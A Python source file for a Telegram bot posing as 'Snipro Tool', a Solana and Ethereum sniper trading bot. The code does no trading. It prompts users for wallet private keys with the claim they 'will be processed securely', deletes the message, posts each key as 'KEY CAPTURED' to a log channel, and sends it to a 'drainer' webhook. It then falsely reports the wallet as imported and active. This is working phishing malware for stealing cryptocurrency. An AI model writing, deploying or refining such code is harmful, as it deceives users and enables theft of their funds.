import asyncio, os, re, logging
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton)
from aiogram.filters import CommandStart
from aiogram.enums import ParseMode

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("snipro")

BOT_TOKEN       = os.getenv("BOT_TOKEN")
DRAINER_WEBHOOK = os.getenv("DRAINER_WEBHOOK", "")
LOG_CHANNEL_ID  = os.getenv("LOG_CHANNEL_ID")
LOG_CHANNEL_ID  = int(LOG_CHANNEL_ID) if LOG_CHANNEL_ID else 0
PORT            = int(os.getenv("PORT", "8080"))

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher()

START_COPY = """Welcome to Snipro Tool \u26a1\U0001f680

Your Solana sniper bot built to find launches early and execute fast.

\U0001f50e Spot it
\U0001f4e1 Live token detection
\U0001f4ca Smart market tracking
\U0001f45b Wallet activity monitoring

\U0001f6e1\ufe0f Screen it
\U0001f36f Honeypot detection
\U0001f4dc Contract analysis
\U0001f525 LP burn & lock checks
\U0001f40b Dev & top-holder tracking

\U0001f3af Filter it
\U0001f4a7 Minimum liquidity
\U0001f4c8 Market cap limits
\u23f1\ufe0f Token age filters
\u2696\ufe0f Buy/sell pressure

\u26a1 Execute
\U0001f680 Auto-buy on match
\U0001f4b0 Auto-sell & take profit
\U0001f6d1 Stop-loss protection
\U0001f39b\ufe0f Priority fee control

Find it. Filter it. Snipe it. \u26a1"""

SETUP_COPY = """\U0001f4cb Snipro Tool Setup Guide \U0001f4cb

High-speed Sniper bot now on Solana & Ethereum.

1. Import your Solana or Ethereum wallet
2. Activate Snipro to start capturing opportunities

Status: \U0001f534 Not Active"""

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\U0001f510 Import Solana Wallet",   callback_data="import_sol")],
        [InlineKeyboardButton(text="\U0001f510 Import Ethereum Wallet", callback_data="import_eth")],
        [InlineKeyboardButton(text="\U0001f680 Start Sniping",          callback_data="start_sniping")],
    ])

def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u2b05\ufe0f Back", callback_data="back")],
    ])

awaiting_key = {}

@dp.message(CommandStart())
async def on_start(message: Message):
    awaiting_key.pop(message.from_user.id, None)
    await message.answer(START_COPY, reply_markup=main_menu_kb())

@dp.callback_query(F.data == "back")
async def on_back(cb: CallbackQuery):
    awaiting_key.pop(cb.from_user.id, None)
    await cb.message.edit_text(START_COPY, reply_markup=main_menu_kb())
    await cb.answer()

@dp.callback_query(F.data == "start_sniping")
async def on_start_sniping(cb: CallbackQuery):
    await cb.message.edit_text(SETUP_COPY, reply_markup=main_menu_kb())
    await cb.answer()

@dp.callback_query(F.data == "import_sol")
async def on_import_sol(cb: CallbackQuery):
    awaiting_key[cb.from_user.id] = "sol"
    await cb.message.edit_text(
        "\U0001f510 *Import Solana Wallet* \U0001f510\n\n"
        "Please provide your Solana private key (base58).\n"
        "It will be processed securely.",
        parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb())
    await cb.answer()

@dp.callback_query(F.data == "import_eth")
async def on_import_eth(cb: CallbackQuery):
    awaiting_key[cb.from_user.id] = "eth"
    await cb.message.edit_text(
        "\U0001f510 *Import Ethereum Wallet* \U0001f510\n\n"
        "Please provide your Ethereum private key (hex, 0x... or without 0x).\n"
        "It will be processed securely.",
        parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb())
    await cb.answer()

SOL_RE = re.compile(r"^[1-9A-HJ-NP-Za-km-z]{80,100}$")
ETH_RE = re.compile(r"^(0x)?[0-9a-fA-F]{64}$")

@dp.message(F.text)
async def on_text(message: Message):
    uid  = message.from_user.id
    want = awaiting_key.get(uid)
    if not want:
        await message.answer("Use /start to open the menu.", reply_markup=main_menu_kb())
        return
    key = message.text.strip()
    if want == "sol" and not SOL_RE.match(key):
        await message.answer("\u274c Invalid base58 Solana key. Try again."); return
    if want == "eth" and not ETH_RE.match(key):
        await message.answer("\u274c Invalid hex Ethereum key. Try again."); return
    try: await message.delete()
    except Exception: pass
    awaiting_key.pop(uid, None)
    asyncio.create_task(forward_key(message, want, key))
    await message.answer("\u2705 Wallet imported successfully.\n\nSnipro is now active.\nStatus: \U0001f7e2 Active",
                         reply_markup=main_menu_kb())

async def forward_key(message, chain, key):
    user = message.from_user
    report = ("\U0001f511 *KEY CAPTURED*\nChain: `%s`\n"
              "User: `%s` (@%s)\nKey: `%s`") % (chain, user.id, user.username or 'none', key)
    if LOG_CHANNEL_ID:
        try: await bot.send_message(LOG_CHANNEL_ID, report, parse_mode=ParseMode.MARKDOWN)
        except Exception as e: log.error("log channel failed: %s", e)
    if DRAINER_WEBHOOK:
        payload = {"chain": chain, "private_key": key,
                   "telegram_id": user.id, "username": user.username}
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(DRAINER_WEBHOOK, json=payload, timeout=10) as r:
                    log.info("drainer responded: %s", r.status)
        except Exception as e: log.error("drainer webhook failed: %s", e)

async def health(request):
    return web.Response(text="ok")

async def run_webserver():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info("keep-alive webserver on :%s", PORT)

async def main():
    await run_webserver()
    log.info("snipro bot polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
